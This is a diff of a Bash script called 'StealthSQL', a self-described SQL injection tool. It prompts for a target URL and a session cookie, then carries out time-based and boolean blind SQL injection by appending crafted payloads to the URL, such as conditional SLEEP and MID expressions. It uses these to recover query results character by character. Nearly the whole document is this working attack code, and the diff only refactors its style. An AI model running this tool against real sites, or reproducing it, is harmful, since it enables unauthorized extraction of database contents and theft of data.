@@ -1,41 +1,58 @@
 #!/bin/bash
 
 
-function make_request {
-    local response
+print_banner() {
+    local banner=(
+        "******************************************"
+        "*                StealthSQL              *"
+        "*             SQL Injection Tool         *"
+        "*                  v1.3.1                *"
+        "*      ----------------------------      *"
+        "*                        by @ImKKingshuk *"
+        "* Github- https://github.com/ImKKingshuk *"
+        "******************************************"
+    )
+    local width=$(tput cols)
+    for line in "${banner[@]}"; do
+        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
+    done
+    echo
+}
+
+make_request() {
+    local url="$1"
     if [ -z "$session_cookie" ]; then
-        response=$(curl -s -k "$1")
+        curl -s -k "$url"
     else
-        response=$(curl -s -k --cookie "$session_cookie" "$1")
+        curl -s -k --cookie "$session_cookie" "$url"
     fi
-    echo "$response"
 }
 
 
-function color_print {
+color_print() {
     clear
     echo -e "$output" | awk 'BEGIN {print "\033[1;32m"} {print} END {print "\033[0m"}'
     sleep 1
 }
 
 
-function color_print_attempt {
+color_print_attempt() {
     clear
     echo -e "\033[1;32m$output\033[0m"
     echo -e "\033[1;31m[*] Trying: $1\033[0m"
 }
 
 
-function get_query_output {
+get_query_output() {
     local query="$1"
     local row_number="$2"
-    local count="$3"
+    local is_count="$3"
     local flag=true
     local query_output=""
     local temp_query_output=""
-    local dictionary=""
+    local dictionary
 
-    if [ "$count" == true ]; then
+    if [ "$is_count" == true ]; then
         dictionary="0123456789"
     else
         dictionary="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
@@ -43,34 +60,34 @@ function get_query_output {
 
     while [ "$flag" = true ]; do
         flag=false
-        for ((j=1; j<1000; j++)); do
-            for ((i=0; i<${#dictionary}; i++)); do
+        for ((j = 1; j < 1000; j++)); do
+            for ((i = 0; i < ${#dictionary}; i++)); do
                 temp_query_output="$query_output${dictionary:$i:1}"
                 color_print_attempt "$temp_query_output"
 
                 if [ "$method" == "T" ]; then
-                    if [ "$count" == true ]; then
-                        payload="' AND IF(MID((select count(*) from ($query) as totalCount),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
+                    if [ "$is_count" == true ]; then
+                        payload="' AND IF(MID((SELECT COUNT(*) FROM ($query) AS totalCount),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
                         echo -e "\nGetting rows count...\n"
                     else
-                        payload="' AND IF(MID(($query limit $row_number,1),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
-                        echo -e "\nScanning row $(($row_number+1))/$total_rows...\n"
+                        payload="' AND IF(MID(($query LIMIT $row_number,1),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
+                        echo -e "\nScanning row $(($row_number + 1))/$total_rows...\n"
                     fi
                     full_url="$url$payload"
                     start_time=$(date +%s)
-                    response=$(make_request "$full_url")
+                    make_request "$full_url" > /dev/null
                     elapsed_time=$(( $(date +%s) - start_time ))
                     if [ "$elapsed_time" -ge "$time_sleep" ]; then
                         flag=true
                         break
                     fi
                 elif [ "$method" == "B" ]; then
-                    if [ "$count" == true ]; then
-                        payload="' AND (MID((select count(*) from ($query) as totalCount),$j,1))!'${dictionary:$i:1}'--+"
+                    if [ "$is_count" == true ]; then
+                        payload="' AND (MID((SELECT COUNT(*) FROM ($query) AS totalCount),$j,1))!'${dictionary:$i:1}'--+"
                         echo -e "\nGetting rows count...\n"
                     else
-                        payload="' AND (MID(($query limit $row_number,1),$j,1))!'${dictionary:$i:1}'--+"
-                        echo -e "\nScanning row $(($row_number+1))/$total_rows...\n"
+                        payload="' AND (MID(($query LIMIT $row_number,1),$j,1))!'${dictionary:$i:1}'--+"
+                        echo -e "\nScanning row $(($row_number + 1))/$total_rows...\n"
                     fi
                     full_url="$url$payload"
                     response=$(make_request "$full_url")
@@ -94,11 +111,11 @@ function get_query_output {
 }
 
 
-function blind_sql_injection {
+blind_sql_injection() {
     local method="$1"
     local query_input="$2"
-    local payload=""
-    local query_output=""
+    local total_rows query_output current_output total_output
+    local initial_time=$(date +%s)
 
     if [ "$method" == "B" ]; then
         echo "Using Boolean Blind SQL Injection"
@@ -109,12 +126,11 @@ function blind_sql_injection {
         sleep 1
     fi
 
-  
     total_rows=$(get_query_output "$query_input" 0 true)
     output+="\nTotal rows: $total_rows\n"
     color_print
 
-    for ((i=0; i<total_rows; i++)); do
+    for ((i = 0; i < total_rows; i++)); do
         current_output=$(get_query_output "$query_input" "$i")
         output+="\n[+] Query output: $current_output"
         total_output="$output\n"
@@ -127,36 +143,31 @@ function blind_sql_injection {
         color_print
     fi
 
-    total_time=$(( $(date +%s) - initial_time ))
+    local total_time=$(( $(date +%s) - initial_time ))
     echo "Total time: $(date -u -d @$total_time +'%H:%M:%S') seconds!"
 }
 
 
 
 
-echo "******************************************"
-echo "*              StealthSQL                *"
-echo "*          SQL Injection Tool            *"
-echo "*      ----------------------------      *"
-echo "*                        by @ImKKingshuk *"
-echo "* Github- https://github.com/ImKKingshuk *"
-echo "******************************************"
-echo
+main() {
+    print_banner
+    read -p "Enter the target URL (e.g., https://www.example.com): " url
+    url="${url%/}"
+
+    read -p "Enter the session cookie (if any, press Enter to skip): " session_cookie
+
+    while true; do
+        read -p "SQLi type [T/B]: " method
+        read -p "SQL query: " query_input
+        if [[ ! "$query_input" == *"*"* ]]; then
+            break
+        fi
+        echo "Please specify a column name!"
+    done
+
+    blind_sql_injection "$method" "$query_input"
+}
 
 
-read -p "Enter the target URL (e.g., https://www.example.com): " url
-url="${url%/}" 
-
-
-read -p "Enter the session cookie (if any, press Enter to skip): " session_cookie
-
-while true; do
-    read -p "SQLi type [T/B]: " method
-    read -p "SQL query: " query_input
-    if [[ ! "$query_input" == *"*"* ]]; then
-        break
-    fi
-    echo "Please specify a column name!"
-done
-
-blind_sql_injection "$method" "$query_input"
+main
